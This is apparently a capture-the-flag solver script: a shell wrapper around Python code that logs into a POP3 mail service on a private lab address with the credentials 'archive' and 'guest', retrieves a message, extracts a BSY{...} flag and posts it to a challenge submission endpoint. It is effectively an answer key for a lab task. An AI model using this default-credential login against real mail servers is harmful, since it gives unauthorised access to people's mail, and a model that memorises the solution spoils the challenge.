#!/bin/sh
set -eu

FLAG=$(python3 - <<'PY'
import re
import socket

TARGET = "172.20.0.141"
PORT = 46110


def read_line(sock):
    data = bytearray()
    while len(data) < 4096:
        byte = sock.recv(1)
        if not byte or byte == b"\n":
            break
        if byte != b"\r":
            data.extend(byte)
    return data.decode("ascii", "replace")


def command(sock, value):
    sock.sendall(value.encode("ascii") + b"\r\n")
    return read_line(sock)


with socket.create_connection((TARGET, PORT), timeout=8) as sock:
    sock.settimeout(8)
    if not read_line(sock).startswith("+OK"):
        raise SystemExit("Unexpected greeting")
    if not command(sock, "USER archive").startswith("+OK"):
        raise SystemExit("Mailbox selection failed")
    if not command(sock, "PASS guest").startswith("+OK"):
        raise SystemExit("Mailbox login failed")
    if not command(sock, "RETR 1").startswith("+OK"):
        raise SystemExit("Message retrieval failed")
    lines = []
    while True:
        line = read_line(sock)
        if line == ".":
            break
        if line:
            lines.append(line)

match = re.search(r"BSY\{[^}\r\n]+\}", "\n".join(lines))
if not match:
    raise SystemExit("No flag found in retrieved message")
print(match.group(0))
PY
)
PAYLOAD=$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":"scl-challenge-frame-f376a7","task_id":"task1","flag":sys.argv[1]}))' "$FLAG")
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$PAYLOAD"
